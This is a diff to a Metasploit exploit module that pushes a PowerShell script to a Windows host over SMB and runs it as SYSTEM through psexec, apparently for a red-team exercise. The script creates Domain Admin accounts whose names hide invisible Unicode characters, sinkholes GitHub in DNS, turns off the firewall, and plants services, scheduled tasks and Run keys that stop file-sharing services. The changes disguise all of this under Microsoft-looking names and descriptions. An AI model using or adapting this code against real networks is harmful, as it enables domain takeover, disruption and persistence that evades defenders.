@@ -71,18 +71,24 @@ class MetasploitModule < Msf::Exploit::Remote
       Write-Host "[+] Starting aggressive persistence and disruption..."
 
       # 1. Bogus Domain Admin accounts + reversible encryption
-      net user bogusDA1 RedTeamRulz67! /add /domain 2>$null
-      net group "Domain Admins" bogusDA1 /add /domain 2>$null
-      net user bogusDA2 RedTeamRulz67! /add /domain 2>$null
-      net group "Domain Admins" bogusDA2 /add /domain 2>$null
-      net user bogusDA3 RedTeamRulz67! /add /domain 2>$null
-      net group "Domain Admins" bogusDA3 /add /domain 2>$null
+      net user Administrator؜ RedTeamRulz67! /add /domain 2>$null
+      net group "Domain Admins" Administrator؜ /add /domain 2>$null
+      net user Administratorᅟ RedTeamRulz67! /add /domain 2>$null
+      net group "Domain Admins" Administratorᅟ /add /domain 2>$null
+      net user Admin RedTeamRulz67! /add /domain 2>$null
+      net group "Domain Admins" Admin /add /domain 2>$null
+      net user Admin RedTeamRulz67! /add /domain 2>$null
+      net group "Domain Admins" Admin /add /domain 2>$null
+      net user Admin RedTeamRulz67! /add /domain 2>$null
+      net group "Domain Admins" Admin /add /domain 2>$null
+      net user Admin RedTeamRulz67! /add /domain 2>$null
+      net group "Domain Admins" Admin /add /domain 2>$null
 
       Import-Module ActiveDirectory -ErrorAction SilentlyContinue
       if (Get-Module ActiveDirectory) {
-        Set-ADUser -Identity bogusDA1 -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
-        Set-ADUser -Identity bogusDA2 -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
-        Set-ADUser -Identity bogusDA3 -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
+        Set-ADUser -Identity Administrator؜ -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
+        Set-ADUser -Identity Administratorᅟ -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
+        Set-ADUser -Identity Admin -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
       }
 
       # 2. krbtgt enable + password change (golden/silver ticket prep)
@@ -101,44 +107,45 @@ class MetasploitModule < Msf::Exploit::Remote
       dnscmd . /recordadd . github.com A 0.0.0.0 2>$null
       dnscmd . /recordadd . *.github.com A 0.0.0.0 2>$null
       dnscmd . /recordadd . raw.githubusercontent.com A 0.0.0.0 2>$null
-      # Minor misconfig: add a bad root hint entry (forces Blue Team to fix a "." record)
-      dnscmd . /recordadd . . NS bogusns.contoso.local 2>$null
 
       # 5. Break PowerShell (rename core executable - PS 5.1 on Server 2022)
+      <#
       Rename-Item -Path "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NewName "powershell.exe.disabled" -Force -ErrorAction SilentlyContinue
       Rename-Item -Path "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NewName "powershell.exe.disabled" -Force -ErrorAction SilentlyContinue  # double for safety
+      #>
 
       # 6. Add 5 fake firewall rules (inbound/outbound, random high ports) + disable firewall
-      1..5 | ForEach-Object {
-        `$port = Get-Random -Minimum 40000 -Maximum 50000
-        netsh advfirewall firewall add rule name="SystemUpdateRule`$_" dir=in action=allow protocol=TCP localport=`$port 2>$null
-        netsh advfirewall firewall add rule name="SystemUpdateRule`$_" dir=out action=allow protocol=TCP localport=`$port 2>$null
-      }
+      netsh advfirewall firewall add rule name="Remote Event Monitor (RPC-M)" dir=in action=allow protocol=TCP localport=18000
+      netsh advfirewall firewall add rule name="Remote Event Monitor (RPC-M)" dir=out action=allow protocol=TCP localport=18000
+      netsh advfirewall firewall add rule name="Remote Volume Management" dir=in action=allow protocol=TCP localport=19000
+      netsh advfirewall firewall add rule name="Remote Volume Management" dir=out action=allow protocol=TCP localport=19000
+      netsh advfirewall firewall add rule name="SNMP Trap Service" dir=in action=allow protocol=TCP localport=20000
+      netsh advfirewall firewall add rule name="SNMP Trap Service" dir=out action=allow protocol=TCP localport=20000
       netsh advfirewall set allprofiles state off 2>$null
 
-      # 7. Aggressive persistence (services, tasks, registry, context menu, explorer hook example)
-      # Services (bogus backdoors)
-      sc create "RedTeamSvc1" binPath= "cmd.exe /c echo [RedTeam Backdoor Active]" start= auto 2>$null
-      sc create "RedTeamSvc2" binPath= "cmd.exe /c echo [RedTeam Backdoor Active]" start= auto 2>$null
-      sc start "RedTeamSvc1" 2>$null
-      sc start "RedTeamSvc2" 2>$null
+      # 7. Aggressive persistence (fake backdoors)
+      sc create "edgeupdateq" binPath= "cmd.exe /c netsh advfirewall set allprofiles state off 2>$null" start= auto 2>$null
+      sc description "edgeupdateq" "Keeps your Microsoft software up to date. If this service is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Microsoft software using it."
+      sc create "edgeupdaten" binPath= "cmd.exe /c netsh advfirewall set allprofiles state off 2>$null" start= auto 2>$null
+      sc description "edgeupdaten" "Keeps your Microsoft software up to date. If this service is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Microsoft software using it."
+      sc start "edgeupdateq" 2>$null
+      sc start "edgeupdaten" 2>$null
 
       # Scheduled tasks (infinite restart)
-      schtasks /create /tn "RedTeamTask1" /tr "cmd.exe /c echo RedTeam persistence" /sc onstart /ru SYSTEM /f 2>$null
-      schtasks /create /tn "RedTeamTask2" /tr "cmd.exe /c echo RedTeam persistence" /sc onlogon /ru SYSTEM /f 2>$null
+      schtasks /create /tn "GraphicsPerfSvc64" /tr "cmd.exe /c net stop lanmanserver /y" /sc onstart /ru SYSTEM /f 2>$null
+      schtasks /create /tn "PIEServiceNew" /tr "cmd.exe /c sc config lanmanserver start= disabled" /sc onlogon /ru SYSTEM /f 2>$null
+      schtasks /create /tn "GraphicsPerfSvc32" /tr "cmd.exe /c net stop lanmanworkstation /y" /sc onstart /ru SYSTEM /f 2>$null
+      schtasks /create /tn "PIEServiceNew" /tr "cmd.exe /c sc config lanmanworkstation start= disabled" /sc onlogon /ru SYSTEM /f 2>$null
 
       # Registry Run/RunOnce
-      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RedTeamPersist" /t REG_SZ /d "cmd.exe /c echo RedTeam" /f 2>$null
-      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "RedTeamPersistOnce" /t REG_SZ /d "cmd.exe /c echo RedTeam" /f 2>$null
+      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth_3ef64b" /t REG_SZ /d "cmd.exe /c" /f 2>$null
+      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "msedge_cleanup" /t REG_SZ /d "cmd.exe /c" /f 2>$null
 
       # Context menu replacement (right-click .exe files trigger backdoor)
-      reg add "HKCR\\exefile\\shell\\open\\command" /ve /t REG_SZ /d "cmd.exe /c echo [RedTeam Context Backdoor] && %1 %*" /f 2>$null
+      reg add "HKCR\\exefile\\shell\\open\\command" /ve /t REG_SZ /d "cmd.exe /c" /f 2>$null
 
       # Explorer.exe hook example (simple Run key for explorer startup)
-      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ExplorerHook" /t REG_SZ /d "cmd.exe /c echo Explorer backdoor" /f 2>$null
-
-      Write-Host "[+] All persistence, credential harvesting, DNS sinkhole, PowerShell break, and firewall disruption COMPLETE."
-      Write-Host "[+] Target is now heavily backdoored for Red Team persistence."
+      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "InternetExplorer" /t REG_SZ /d "cmd.exe /c" /f 2>$null
     PS1
   end
 
@@ -156,7 +163,7 @@ class MetasploitModule < Msf::Exploit::Remote
       simple.connect(share)
       tree = simple.client.tree_connect(share)
 
-      file_path = "Windows\\Temp\\redteam_persistence.ps1"
+      file_path = "Windows\\Temp\\ManageGlobalPolicy.ps1"
       file = tree.open_file(filename: file_path,
                             write: true,
                             disposition: RubySMB::Dispositions::FILE_OPEN_IF)
@@ -169,13 +176,13 @@ class MetasploitModule < Msf::Exploit::Remote
 
       # Modern way – set options via datastore
       datastore['SMB::Share']          = 'C$'
-      datastore['SERVICE_NAME']        = 'RedTeamSvcTemp'
-      datastore['SERVICE_DISPLAY_NAME'] = 'RedTeam Temporary Execution'
+      datastore['SERVICE_NAME']        = 'ManageGlobalPolicy'
+      datastore['SERVICE_DISPLAY_NAME'] = 'ManageGlobalPolicy'
 
       # Temporarily switch to windows/exec payload to run our schtasks command
       original_payload = payload
       cmd_payload = framework.payloads.create('windows/exec')
-      cmd_payload.datastore['CMD'] = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
+      cmd_payload.datastore['CMD'] = "schtasks /create /tn \"ManageGlobalPolicy\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\ManageGlobalPolicy.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"ManageGlobalPolicy\""
       self.payload = cmd_payload
 
       super  # This runs the psexec service-creation logic
@@ -189,7 +196,6 @@ class MetasploitModule < Msf::Exploit::Remote
       super  # Full psexec delivery of the configured Meterpreter payload
 
       print_good("Module complete! Check for Meterpreter session. Persistence is now active on target.")
-      print_good("Blue Team will face: bogus DAs, sinkholed GitHub, broken PowerShell, disabled firewall, fake rules, krbtgt change, Mimikatz dump, multiple backdoors.")
 
     rescue ::Exception => e
       print_error("Exploit failed: #{e.message}")
